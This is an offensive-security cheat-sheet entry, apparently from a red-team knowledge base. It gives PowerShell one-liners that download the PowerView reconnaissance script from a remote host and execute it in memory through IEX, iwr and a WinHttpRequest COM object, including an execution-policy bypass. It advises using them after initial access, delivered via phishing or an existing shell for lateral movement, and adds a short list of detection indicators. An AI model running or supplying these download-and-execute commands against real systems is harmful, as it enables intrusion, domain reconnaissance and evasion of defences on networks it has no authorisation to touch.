---
type: code
language: powershell
verified: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Windows
tags:
  - powershell
  - download-execute
  - recon
validated: true
---

# PowerView-Download-and-Execution-Snippets

## Code

```powershell
# Download and execute PowerView

# Proxy-aware
IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/PowerView.ps1')
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/PowerView.ps1') | powershell -noprofile -
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.10.10.10/PowerView.ps1')|iex"

# Non-proxy aware
$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://10.10.10.10/PowerView.ps1',$false);$h.send();iex $h.responseText
```

## Description

This code collection provides multiple one-liner snippets for downloading and executing the PowerView reconnaissance script in PowerShell. It includes proxy-aware variants using WebClient and IEX for environments with proxies, and a non-proxy variant using WinHttpRequest COM object for direct connections. These snippets load PowerView functions into memory for Active Directory enumeration without file drops.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| http://10.10.10.10 | URL hosting the PowerView.ps1 script (replace with attacker-controlled server) | http://attacker.com/PowerView.ps1 |

## Usage

Execute in an elevated PowerShell session post-initial access. Choose the snippet based on network config (check with `netsh winhttp show proxy`). After loading, use PowerView functions like `Get-NetUser` for recon. Deliver via phishing or existing shell for lateral movement.

## Detection

- PowerShell logs showing IEX, DownloadString, or iwr to external domains.
- EDR alerts on WinHttpRequest COM instantiation or proxy credential configs.
- Network logs of HTTP GET to PowerView.ps1 from internal hosts.
- AMSI scans flagging script downloads.

## Related

- [[procedures/Download-and-Execute-PowerView-Script]]
- [[tools/PowerView]]
